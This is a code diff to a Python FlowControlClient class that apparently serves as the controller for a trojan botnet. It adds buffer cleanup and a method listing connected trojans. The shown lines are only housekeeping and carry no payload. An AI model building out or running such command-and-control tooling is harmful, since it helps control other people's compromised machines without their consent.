@@ -49,6 +49,8 @@ class FlowControlClient(TCPClient):
         :param command: (string) the command to be sent to the trojans
         :return:(void)
         """
+        if self.end_seq in self.receive_buffer:
+            self.receive_buffer.remove(self.end_seq)
         prefix = "["
         for name in self.cache:
             prefix += name + ","
@@ -96,5 +98,11 @@ class FlowControlClient(TCPClient):
         """
         string = "The following trojans are online, requested {0}s ago\n".format(str(time.time() - self.last_update))
         for name in self.available:
+            string += " - {0}\n".format(name)
+        return string[:-1]
+
+    def get_info_cached(self):
+        string = "the folowing trojans are connected:\n"
+        for name in self.cache:
             string += " - {0}\n".format(name)
         return string[:-1]
